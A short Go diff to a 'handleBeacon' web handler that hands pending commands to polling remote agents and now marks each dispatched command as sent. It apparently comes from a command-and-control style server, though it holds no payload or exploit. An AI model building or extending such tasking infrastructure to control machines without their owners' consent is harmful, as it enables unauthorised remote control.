@@ -70,12 +70,7 @@ func (h *AgentHandler) handleBeacon(c *gin.Context) {
 		return
 	}
 
-	// if err := h.agentStore.UpdateCommandStatus(agentID); err != nil {
-	// 	c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
-	// 	return
-	// }
-
-	commands, err := h.agentRepository.GetPendingCommands(agentID)
+	commands, err := h.agentRepository.GetCommandsByStatus(agentID, models.StatusPending)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
@@ -83,16 +78,22 @@ func (h *AgentHandler) handleBeacon(c *gin.Context) {
 
 	if len(commands) > 0 {
 		cmd := commands[0]
+
+		if err := h.agentRepository.UpdateCommandStatus(cmd.ID, models.StatusSend); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+
 		c.JSON(http.StatusOK, gin.H{
 			"command":    cmd.Command,
-			"nextBeacon": 10, // Recommend beaconing again in 10 seconds
+			"nextBeacon": 10,
 		})
 		return
 	}
 
 	c.JSON(http.StatusOK, gin.H{
 		"status":     "acknowledged",
-		"nextBeacon": 10, // Default beacon interval
+		"nextBeacon": 10,
 	})
 }
 
